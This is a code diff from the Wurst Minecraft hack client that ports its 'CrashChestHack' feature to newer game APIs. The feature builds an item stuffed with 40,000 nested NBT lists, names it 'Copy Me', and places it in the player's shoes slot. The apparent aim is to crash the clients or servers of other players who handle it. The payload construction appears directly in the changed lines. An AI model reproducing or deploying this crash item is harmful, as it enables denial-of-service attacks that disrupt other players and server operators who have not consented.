@@ -1,5 +1,5 @@
 /*
- * Copyright (c) 2014-2024 Wurst-Imperium and contributors.
+ * Copyright (c) 2014-2025 Wurst-Imperium and contributors.
  *
  * This source code is subject to the terms of the GNU General Public
  * License, version 3. If a copy of the GPL was not distributed with this
@@ -8,6 +8,9 @@
 package net.wurstclient.hacks;
 
 import net.minecraft.block.Blocks;
+import net.minecraft.component.DataComponentTypes;
+import net.minecraft.component.type.NbtComponent;
+import net.minecraft.entity.EquipmentSlot;
 import net.minecraft.item.ItemStack;
 import net.minecraft.nbt.NbtCompound;
 import net.minecraft.nbt.NbtList;
@@ -37,7 +40,7 @@ public final class CrashChestHack extends Hack
 			return;
 		}
 		
-		if(!MC.player.getInventory().getArmorStack(0).isEmpty())
+		if(!MC.player.getEquippedStack(EquipmentSlot.FEET).isEmpty())
 		{
 			ChatUtils.error("Please clear your shoes slot.");
 			setEnabled(false);
@@ -50,12 +53,12 @@ public final class CrashChestHack extends Hack
 		NbtList nbtList = new NbtList();
 		for(int i = 0; i < 40000; i++)
 			nbtList.add(new NbtList());
-		nbtCompound.put("EatSujuk", nbtList);
-		stack.setNbt(nbtCompound);
-		stack.setCustomName(Text.literal("Copy Me"));
+		nbtCompound.put("www.wurstclient.net", nbtList);
+		stack.set(DataComponentTypes.CUSTOM_DATA, NbtComponent.of(nbtCompound));
+		stack.set(DataComponentTypes.CUSTOM_NAME, Text.literal("Copy Me"));
 		
 		// give item
-		MC.player.getInventory().armor.set(0, stack);
+		MC.player.equipment.put(EquipmentSlot.FEET, stack);
 		ChatUtils.message("Item has been placed in your shoes slot.");
 		setEnabled(false);
 	}
